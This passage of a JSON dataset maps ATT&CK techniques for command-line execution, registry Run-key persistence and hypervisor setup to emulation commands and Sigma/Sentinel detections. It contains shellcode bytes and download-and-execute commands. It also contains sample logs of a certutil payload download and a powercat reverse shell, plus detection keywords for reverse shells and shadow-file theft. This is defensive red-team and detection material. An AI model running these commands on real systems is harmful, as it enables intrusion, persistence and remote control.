0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}}}, {"Mitre Stockpile - Start a new 54ndc47 agent in background": {"id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e", "name": "Start 54ndc47", "description": "Start a new 54ndc47 agent in background", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "platforms": {"darwin": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}}}}, {"SysmonHunter - T1059": {"name": "Command-Line Interface", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\cmd.exe", "flag": "regex"}}}, {"type": "process", "process": {"cmdline": {"pattern": "cmd.exe|/c", "op": "and"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_sqloscmd", "ATT&CK Technique #1": "T1059", "ATT&CK Technique #2": "", "Technique": "Command-Line Interface", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_sqloscmd\":  [\"T1059\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/spawnas", "ATT&CK Technique #1": "T1059", "ATT&CK Technique #2": "", "Technique": "Command-Line Interface", "Concatenate for Python Dictionary": "\"powershell/management/spawnas\":  [\"T1059\"],"}}], "command_list": ["curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\n", {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, {"darwin": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Off\n", "cleanup": ".\\wifi.ps1 -On\n", "payloads": ["wifi.ps1"]}}}, {"darwin": {"sh": {"cleanup": "rm #{payload}\n"}}, "linux": {"sh": {"cleanup": "rm #{payload}\n"}}, "windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \"#{payload}\""}}}, {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}, {"darwin": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}}, "\\\\Windows\\\\.+\\\\cmd.exe", "cmd.exe|/c", "powershell/lateral_movement/invoke_sqloscmd", "powershell/lateral_movement/invoke_sqloscmd", "powershell/management/spawnas", "powershell/management/spawnas", "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ certutil.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: CertUtil.exe\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertUtil.exe\nCommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0xbcc\nNew Process Name: C: \\ Windows \\ System32 \\ certutil.exe\n\n#windows server 2008 (excluding 2008) or more systems can be configured to create a policy review process, achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters.", "Log\nEventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded\nProcess information:\nNew Process ID: 0x474\nNew Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0x3f8\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\n\nEventID: 5156\nApplication Information:\nProcess ID: 1016\nApplication Name: \\ device \\ harddiskvolume2 \\ users \\ 12306br0 \\ desktop \\ a \\ payload.exe\n\nInternet Information:\nDirection: Outbound\nSource address: 192.168.126.149\nSource Port: 49221\nDestination address: 192.168.126.146\nDestination Port: 53\nProtocol: 6\n\nEventID: 1 #sysmon log\nImage: C: \\ Windows \\ System32 \\ cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Command Processor\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: C: \\ Windows \\ system32 \\ cmd.exe / C C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}\nLogonId: 0x550ac\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8\nParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}\nParentProcessId: 1112\nParentImage: C: \\ Windows \\ System32 \\ ftp.exe\nParentCommandLine: ftp", "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ powershell.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows PowerShell\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell -c \"IEX (New-Object System.Net.WebClient) .DownloadString ( 'http://192.168.126.146/powercat.ps1'); powercat -c 192.168.126.146 -p 1234 -e cmd\"\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x330\nNew Process Name: C: \\ Windows \\ System32 \\ cmd.exe\nToken Type lift: TokenElevationTypeLimited (3)\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xa44\nNew Process Name: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ powershell.exe\n\n#Powershell V5 (V5 containing more than) configuration audit policy, you can achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters. Of course, it can also be used to configure windows server 2008 (excluding 2008) over the audit process to create a policy, you can also record on the command line parameters, and finally to monitoring results."], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"cmd.exe\"", "name": "Command Line Interface"}], "possible_detections": [{"data_source": {"title": "Equation Group Indicators", "id": "41e5c73d-9983-4b69-bd03-e13b67e9623c", "description": "Detects suspicious shell commands used in various Equation Group scripts and tools", "references": ["https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"], "tags": ["attack.execution", "attack.g0020", "attack.t1059"], "author": "Florian Roth", "logsource": {"product": "linux"}, "detection": {"keywords": ["chown root*chmod 4777 ", "cp /bin/sh .;chown", "chmod 4777 /tmp/.scsi/dev/bin/gsh", "chown root:root /tmp/.scsi/dev/bin/", "chown root:root x;", "/bin/telnet locip locport < /dev/console | /bin/sh", "/tmp/ratload", "ewok -t ", "xspy -display ", "cat > /dev/tcp/127.0.0.1/80 <<END", "rm -f /current/tmp/ftshell.latest", "ghost_* -v ", " --wipe > /dev/null", "ping -c 2 *; grep * /proc/net/arp >/tmp/gx", "iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;", "> /var/log/audit/audit.log; rm -f .", "cp /var/log/audit/audit.log .tmp", "sh >/dev/tcp/* <&1 2>&1", "ncat -vv -l -p * <", "nc -vv -l -p * <", "< /dev/console | uudecode && uncompress", "sendmail -osendmail;chmod +x sendmail", "/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron", "chmod 666 /var/run/utmp~", "chmod 700 nscd crond", "cp /etc/shadow /tmp/.", "</dev/console |uudecode > /dev/null 2>&1 && uncompress", "chmod 700 jp&&netstat -an|grep", "uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755", "chmod 700 crond", "wget http*; chmod +x /tmp/sendmail", "chmod 700 fp sendmail pt", "chmod 755 /usr/vmsys/bin/pipe", "chmod -R 755 /usr/vmsys", "chmod 755 $opbin/*tunnel", "chmod 700 sendmail", "chmod 0700 sendmail", "/usr/bin/wget http*sendmail;chmod +x sendmail;", "&& telnet * 2>&1 </dev/console"], "condition": "keywords"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Hacktool Ruler", "id": "24549159-ac1b-479c-8175-d42aea947cae", "description": "This events that are generated when using the hacktool Ruler by Sensepost", "author": "Florian Roth", "date": "2017/05/31", "modified": "2019/07/26", "references": ["https://github.com/sensepost/ruler", "https://github.com/sensepost/ruler/issues/47", "https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427", "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776", "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624"], "tags": ["attack.discovery", "attack.execution", "attack.t1087", "attack.t1075", "attack.t1114", "attack.t1059"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection1": {"EventID": [4776], "Workstation": "RULER"}, "selection2": {"EventID": [4624, 4625], "WorkstationName": "RULER"}, "condition": "(1 of selection*)"}, "falsepositives": ["Go utilities that use staaldraad awesome NTLM library"], "level": "high"}}, {"data_source": {"title": "Command Line Execution with suspicious URL and AppData Strings", "id": "1ac8666b-046f-4201-8aba-1951aaec03a3", "status": "experimental", "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)", "references": ["https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100", "https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100"], "author": "Florian Roth", "tags": ["attack.execution", "attack.t1059"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["cmd.exe /c *http://*%AppData%", "cmd.exe /c *https://*%AppData%"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["High"], "level": "medium"}}]}, {"technique_id": "T1060", "commands": [{"source": "atomics/T1060/T1060.yaml", "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "name": null}, {"source": "atomics/T1060/T1060.yaml", "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "name": null}, {"source": "SysmonHunter - Registry Run Keys / Startup Folder", "command": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/registry", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/registry", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Registry Run Keys / Start Folder": {"attack_technique": "T1060", "display_name": "Registry Run Keys / Start Folder", "atomic_tests": [{"name": "Reg Key Run", "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. \n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Thing to Run", "type": "Path", "default": "C:\\Path\\AtomicRedTeam.exe"}}, "executor": {"name": "command_prompt", "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n", "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n"}}, {"name": "Reg Key RunOnce", "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n", "supported_platforms": ["windows"], "input_arguments": {"thing_to_execute": {"description": "Thing to Run", "type": "Path", "default": "C:\\Path\\AtomicRedTeam.dll"}}, "executor": {"name": "command_prompt", "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n", "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n"}}, {"name": "PowerShell Registry RunOnce", "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n", "supported_platforms": ["windows"], "input_arguments": {"thing_to_execute": {"description": "Thing to Run", "type": "Path", "default": "powershell.exe"}, "reg_key_path": {"description": "Path to registry key to update", "type": "Path", "default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n"}}]}}, {"SysmonHunter - T1060": {"name": "Registry Run Keys / Startup Folder", "description": null, "level": "high", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"}}, "file": {"path": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}}, {"type": "file", "process": {"cmdline": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}, "file": {"path": {"pattern": "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/elevated/registry", "ATT&CK Technique #1": "T1060", "ATT&CK Technique #2": "", "Technique": "Registry Run Keys / Start Folder", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/registry\":  [\"T1060\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/userland/registry", "ATT&CK Technique #1": "T1060", "ATT&CK Technique #2": "", "Technique": "Registry Run Keys / Start Folder", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/registry\":  [\"T1060\"],"}}], "command_list": ["REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n", "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n", "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"'\n", "Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "powershell/persistence/elevated/registry", "powershell/persistence/elevated/registry", "powershell/persistence/userland/registry", "powershell/persistence/userland/registry"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and(registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\"or registry_key_path contains \"*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\*Shell Folders\")", "name": "Registry Run Keys Or Start Folder"}], "possible_detections": [{"data_source": {"title": "Suspicious RUN Key from Download", "id": "9c5037d1-c568-49b3-88c7-9846a5bdc2be", "status": "experimental", "description": "Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories", "references": ["https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/"], "author": "Florian Roth", "date": "2019/10/01", "tags": ["attack.persistence", "attack.t1060"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "Image": ["*\\Downloads\\\\*", "*\\Temporary Internet Files\\Content.Outlook\\\\*", "*\\Local Settings\\Temporary Internet Files\\\\*"], "TargetObject": "*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*"}, "condition": "selection"}, "falsepositives": ["Software installers downloaded and used by users"], "level": "high"}}, {"data_source": {"title": "Registry Persistence via Explorer Run Key", "id": "b7916c2a-fa2f-4795-9477-32b731f70f11", "status": "experimental", "description": "Detects a possible persistence mechanism using RUN key for Windows Explorer and poiting to a suspicious folder", "author": "Florian Roth", "date": "2018/07/18", "references": ["https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": "*\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "Details": ["C:\\Windows\\Temp\\\\*", "C:\\ProgramData\\\\*", "*\\AppData\\\\*", "C:\\$Recycle.bin\\\\*", "C:\\Temp\\\\*", "C:\\Users\\Public\\\\*", "C:\\Users\\Default\\\\*"]}, "condition": "selection"}, "tags": ["attack.persistence", "attack.t1060", "capec.270"], "fields": ["Image", "ParentImage"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "New RUN Key Pointing to Suspicious Folder", "id": "02ee49e2-e294-4d0f-9278-f5b3212fc588", "status": "experimental", "description": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder", "references": ["https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"], "author": "Florian Roth, Markus Neis", "tags": ["attack.persistence", "attack.t1060"], "date": "2018/25/08", "modified": "2019/10/01", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": ["*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*", "*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\\*"], "Details": ["*C:\\Windows\\Temp\\\\*", "*\\AppData\\\\*", "%AppData%\\\\*", "*C:\\$Recycle.bin\\\\*", "*C:\\Temp\\\\*", "*C:\\Users\\Public\\\\*", "%Public%\\\\*", "*C:\\Users\\Default\\\\*", "*C:\\Users\\Desktop\\\\*", "wscript*", "cscript*"]}, "condition": "selection"}, "fields": ["Image"], "falsepositives": ["Software with rare behaviour"], "level": "high"}}]}, {"technique_id": "T1062", "commands": [{"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName test-vm\nInstall-WindowsFeature -Name Hyper-V -ComputerName test-vm -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "name": null}, {"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "name": null}, {"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath C:\\Temp\\test.vhdx -NewVHDSizeBytes 21474836480\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Hypervisor": {"attack_technique": "T1062", "display_name": "Hypervisor", "atomic_tests": [{"name": "Installing Hyper-V Feature", "description": "PowerShell command to check if Hyper-v is installed.\nInstall Hyper-V feature.\nCreate a New-VM\n\nUpon successful execution, powershell will check if Hyper-V is installed, if not, install it and create a base vm. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"hostname": {"description": "Host to query to see if Hyper-V feature is installed.", "type": "string", "default": "test-vm"}, "vm_name": {"description": "Create a new VM.", "type": "string", "default": "testvm"}, "file_location": {"description": "Location of new VHDX file", "type": "string", "default": "C:\\Temp\\test.vhdx"}}, "executor": {"name": "powershell", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n"}}]}}], "command_list": ["Get-WindowsFeature -Name Hyper-V -ComputerName test-vm\nInstall-WindowsFeature -Name Hyper-V -ComputerName test-vm -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath C:\\Temp\\test.vhdx -NewVHDSizeBytes 21474836480\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1063", "commands": [{"source": "atomics/T1063/T1063.yaml", "command": 